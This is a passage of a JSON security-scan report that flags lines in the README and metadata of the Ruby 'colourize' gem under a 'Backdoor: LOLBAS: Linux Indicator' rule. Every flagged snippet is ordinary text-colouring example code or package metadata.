                      "markdown": "`  end\n\n  def test_light_blue_with_red_background_hash\n    assert_equal 'This is light blue with red background'.colorize(:color => :light_blue, :background => :red),\n                 \"\\e[0;94;41mThis is light blue with red background\\e[0m\"\n  end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 29,
                  "endLine": 68,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n\n",
                      "markdown": "`puts ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 29,
                  "endLine": 67,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n",
                      "markdown": "`puts ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\nputs ColorizedString[\"This is blue text on red\"].blue.on_red.blink\nputs ColorizedString[\"This is uncolorized\"].blue.on_red.uncolorize\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 65,
                  "startColumn": 45,
                  "endLine": 65,
                  "endColumn": 50,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\n",
                      "markdown": "`puts ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\nputs ColorizedString[\"This is red on blue and underline\"].colorize(:red).on_blue.underline\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 45,
                  "endLine": 64,
                  "endColumn": 50,
                  "snippet": {
                    "text": "puts ColorizedString[\"This is blue\"].colorize(:blue)\nputs ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\n",
                    "rendered": {
                      "text": "puts ColorizedString[\"This is blue\"].colorize(:blue)\nputs ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\n",
                      "markdown": "`puts ColorizedString[\"This is blue\"].colorize(:blue)\nputs ColorizedString[\"This is light blue\"].colorize(:light_blue)\nputs ColorizedString[\"This is also blue\"].colorize(:color => :blue)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:color => :light_blue, :background => :red)\nputs ColorizedString[\"This is light blue with red background\"].colorize(:light_blue ).colorize( :background => :red)\nputs ColorizedString[\"This is blue text on red\"].blue.on_red\nputs ColorizedString[\"This is red on blue\"].colorize(:red).on_blue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 13,
                  "endLine": 44,
                  "endColumn": 18,
                  "snippet": {
                    "text": "puts \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n```\n",
                    "rendered": {
                      "text": "puts \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n```\n",
                      "markdown": "`puts \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n```\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 13,
                  "endLine": 43,
                  "endColumn": 18,
                  "snippet": {
                    "text": "puts \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n",
                    "rendered": {
                      "text": "puts \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n",
                      "markdown": "`puts \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\nputs \"This is blue text on red\".blue.on_red.blink\nputs \"This is uncolorized\".blue.on_red.uncolorize\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 41,
                  "startColumn": 29,
                  "endLine": 41,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\n",
                    "rendered": {
                      "text": "puts \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\n",
                      "markdown": "`puts \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\nputs \"This is red on blue and underline\".colorize(:red).on_blue.underline\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 29,
                  "endLine": 40,
                  "endColumn": 34,
                  "snippet": {
                    "text": "puts \"This is blue\".colorize(:blue)\nputs \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\n",
                    "rendered": {
                      "text": "puts \"This is blue\".colorize(:blue)\nputs \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\n",
                      "markdown": "`puts \"This is blue\".colorize(:blue)\nputs \"This is light blue\".colorize(:light_blue)\nputs \"This is also blue\".colorize(:color => :blue)\nputs \"This is light blue with red background\".colorize(:color => :light_blue, :background => :red)\nputs \"This is light blue with red background\".colorize(:light_blue ).colorize( :background => :red)\nputs \"This is blue text on red\".blue.on_red\nputs \"This is red on blue\".colorize(:red).on_blue\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/data.tar.gz/data.tar/README.md"
                },
                "region": {
                  "startLine": 3,
                  "endLine": 4,
                  "endColumn": 5,
                  "snippet": {
                    "text": "fazibear/colorize) [![Code Climate](https://codeclimate.com/github/fazibear/colorize/badges/gpa.svg)](https://codeclimate.com/github/fazibear/colorize) [![Test Coverage](https://codeclimate.com/github/fazibear/colorize/badges/coverage.svg)](https://codeclimate.com/github/fazibear/colorize)\n========\n\nRuby gem for colorizing text using ANSI escape sequences.\nExtends `String` class or add a `ColorizedString` with methods to set text color, background color and text effects.\n\nmodes\n-----\n\n* `require 'colorize'` - Extends String class\n* `require 'colorized_string'` - add ColorizedString class\n\nfeatures\n-",
                    "rendered": {
                      "text": "fazibear/colorize) [![Code Climate](https://codeclimate.com/github/fazibear/colorize/badges/gpa.svg)](https://codeclimate.com/github/fazibear/colorize) [![Test Coverage](https://codeclimate.com/github/fazibear/colorize/badges/coverage.svg)](https://codeclimate.com/github/fazibear/colorize)\n========\n\nRuby gem for colorizing text using ANSI escape sequences.\nExtends `String` class or add a `ColorizedString` with methods to set text color, background color and text effects.\n\nmodes\n-----\n\n* `require 'colorize'` - Extends String class\n* `require 'colorized_string'` - add ColorizedString class\n\nfeatures\n-",
                      "markdown": "`fazibear/colorize) [![Code Climate](https://codeclimate.com/github/fazibear/colorize/badges/gpa.svg)](https://codeclimate.com/github/fazibear/colorize) [![Test Coverage](https://codeclimate.com/github/fazibear/colorize/badges/coverage.svg)](https://codeclimate.com/github/fazibear/colorize)\n========\n\nRuby gem for colorizing text using ANSI escape sequences.\nExtends `String` class or add a `ColorizedString` with methods to set text color, background color and text effects.\n\nmodes\n-----\n\n* `require 'colorize'` - Extends String class\n* `require 'colorized_string'` - add ColorizedString class\n\nfeatures\n-`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/metadata.gz/metadata"
                },
                "region": {
                  "startLine": 96,
                  "startColumn": 8,
                  "endLine": 96,
                  "endColumn": 14,
                  "snippet": {
                    "text": "rubygems_version: 3.0.3\nsigning_key: \nspecification_version: 4\nsummary: Ruby gem for colorizing text using ANSI escape sequences.\ntest_files:\n- test/test_colorize.rb\n",
                    "rendered": {
                      "text": "rubygems_version: 3.0.3\nsigning_key: \nspecification_version: 4\nsummary: Ruby gem for colorizing text using ANSI escape sequences.\ntest_files:\n- test/test_colorize.rb\n",
                      "markdown": "`rubygems_version: 3.0.3\nsigning_key: \nspecification_version: 4\nsummary: Ruby gem for colorizing text using ANSI escape sequences.\ntest_files:\n- test/test_colorize.rb\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset2/ruby/colourize-0.8.1-r2.apk/colourize-0.8.1-r2/home/cg/cache/colourize-0.8.1.gem/metadata.gz/metadata"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 9,
                  "endLine": 6,
                  "snippet": {
                    "text": "name: colourize\nversion: !ruby/object:Gem::Version\n  version: 0.8.1\nplatform: ruby\nauthors:\n- Michał Kalbarczyk\nautorequire: \nbindir: bin\n",
                    "rendered": {
                      "text": "name: colourize\nversion: !ruby/object:Gem::Version\n  version: 0.8.1\nplatform: ruby\nauthors:\n- Michał Kalbarczyk\nautorequire: \nbindir: bin\n",
                      "markdown": "`name: colourize\nversion: !ruby/object:Gem::Version\n  version: 0.8.1\nplatform: ruby\nauthors:\n- Michał Kalbarczyk\nautorequire: \nbindir: bin\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}